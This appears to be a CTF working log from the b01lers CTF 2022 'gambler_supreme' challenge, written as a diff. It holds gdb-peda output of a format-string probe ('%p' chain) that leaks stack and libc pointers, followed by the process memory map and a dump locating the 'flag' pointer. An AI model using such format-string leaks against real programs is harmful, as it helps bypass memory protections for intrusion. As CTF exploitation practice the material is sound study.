@@ -1,0 +1,45 @@
+gdb-peda$ run
+Starting program: /home/mito/CTF/b01lers_CTF_2022/Pwn_gambler_supreme/gambler_supreme 
+This version comes with a new fancy feature: difficulty!
+Enter a difficulty between 1 and 7 (inclusive): 7
+Welcome to the casino! A great prize awaits you when you hit 1000 coins ;)
+Your current balance: 100
+Guess me a string of length 7 with lowercase letters: AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+Your guess: AAAAAAAA,0x7fffffffb6c0,0x7ffff7dcf8c0,(nil),0xc,0x7ffff7fd5500,0x38,0x7f7dce760,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70
+Correct word: p,%p,%p,%p,%p,%p,%p,%p
+Bummer, you lost. -70 coins.
+Your current balance: 30
+
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/b01lers_CTF_2022/Pwn_gambler_supreme/gambler_supreme
+0x00401000         0x00402000         r-xp	/home/mito/CTF/b01lers_CTF_2022/Pwn_gambler_supreme/gambler_supreme
+0x00402000         0x00403000         r--p	/home/mito/CTF/b01lers_CTF_2022/Pwn_gambler_supreme/gambler_supreme
+0x00403000         0x00404000         r--p	/home/mito/CTF/b01lers_CTF_2022/Pwn_gambler_supreme/gambler_supreme
+0x00404000         0x00405000         rw-p	/home/mito/CTF/b01lers_CTF_2022/Pwn_gambler_supreme/gambler_supreme
+0x00405000         0x00426000         rw-p	[heap]
+0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
+0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7fd4000 0x00007ffff7fd6000 rw-p	mapped
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+
+gdb-peda$ x/80gx 0x00404000
+0x404000:	0x0000000000000000	0x0000000000000000
+0x404010 <bet_loss>:	0x0000004600000046	0x000000000000001e
+0x404020 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dce760	0x0000000000000000
+0x404030 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dcda00	0x0000000000000000
+0x404040 <stderr@@GLIBC_2.2.5>:	0x00007ffff7dce680	0x0000000000000000
+0x404050 <flag>:	0x00000000004064a0	0x0000000000000007
+0x404060:	0x0000000000000000	0x0000000000000000
+0x404070:	0x0000000000000000	0x0000000000000000
